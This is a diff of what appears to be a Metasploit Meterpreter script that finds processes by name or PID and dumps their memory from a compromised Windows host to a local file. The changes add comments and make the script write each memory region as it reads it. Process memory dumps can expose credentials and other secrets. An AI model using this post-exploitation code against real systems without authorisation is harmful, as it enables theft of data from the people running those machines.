@@ -47,18 +47,18 @@ opts.parse(args) { |opt, idx, val|
 }
 
 
-
+# Function for finding the name of a process given it's PID
 def find_procname(pid)
 	name = nil
 	client.sys.process.get_processes.each do |proc|
 		if proc['pid'] == pid.to_i
-			puts "found"
 			name = proc['name']
 		end
 	end
 	return name
 end
 
+# Find all PID's for a given process name
 def find_pids(name)
 	proc_pid = []
 	client.sys.process.get_processes.each do |proc|
@@ -68,8 +68,9 @@ def find_pids(name)
 	end
 	return proc_pid
 end
+
+# Dumps the memory for a given PID
 def dump_mem(pid,name, toggle)
-	dump = ""
 	host,port = client.tunnel_peer.split(':')
 	# Create Filename info to be appended to created files
 	filenameinfo = "_#{name}_#{pid}_" + ::Time.now.strftime("%Y%m%d.%M%S")
@@ -93,15 +94,16 @@ def dump_mem(pid,name, toggle)
 		mbi = dump_process.memory.query(base_size)
 		# Check if Allocated
 		if mbi["Available"].to_s == "false"
-			dump << mbi.inspect if toggle
-			dump << dump_process.memory.read(mbi["BaseAddress"],mbi["RegionSize"]) 
+			file_local_write(dumpfile,mbi.inspect) if toggle
+			file_local_write(dumpfile,dump_process.memory.read(mbi["BaseAddress"],mbi["RegionSize"]))
 			print_status("\tbase size = #{base_size}")
 		end
 		base_size += mbi["RegionSize"]
 	end
 	print_status("Saving Dumped Memory to #{dumpfile}")
-	file_local_write(dumpfile,dump)
+	
 end
+
 if client.platform =~ /win32|win64/
 	if resource
 		resource.each do |r|
@@ -129,6 +131,3 @@ else
 	print_error("This version of Meterpreter is not supported with this Script!")
 	raise Rex::Script::Completed
 end
-
-
-
